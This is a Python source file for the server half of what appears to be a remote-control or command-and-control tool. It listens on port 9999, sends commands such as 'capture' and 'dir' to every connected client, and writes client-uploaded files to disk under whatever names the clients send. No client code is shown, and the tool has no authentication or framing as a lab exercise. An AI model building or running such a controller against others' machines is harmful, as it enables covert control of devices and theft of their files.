import socket
import threading
import os

HOST = "0.0.0.0"
PORT = 9999

clients = []

def handle_client(conn, addr):
    print(f"[+] Connected by {addr}")
    clients.append(conn)

    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            if data.startswith(b"RESP:"):
                print(data.decode(errors="ignore"))
            else:
                header = data.decode(errors="ignore")
                if "||" in header:
                    filename, size = header.split("||")
                    size = int(size)
                    conn.send(b"READY")
                    received = b""
                    while len(received) < size:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        received += chunk

                    with open(filename, "wb") as f:
                        f.write(received)
                    print(f"[+] Received file: {filename}")
    except Exception as e:
        print("[-] Client error:", e)
    finally:
        conn.close()
        clients.remove(conn)
        print(f"[-] Disconnected: {addr}")

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[+] Server started on {HOST}:{PORT}")

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

def send_command(command):
    if not clients:
        print("[-] No connected clients.")
        return
    for c in clients:
        c.send(f"CMD:{command}".encode())

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()

    while True:
        cmd = input("Enter command (capture/dir/exit): ").strip()
        if cmd == "exit":
            break
        send_command(cmd)
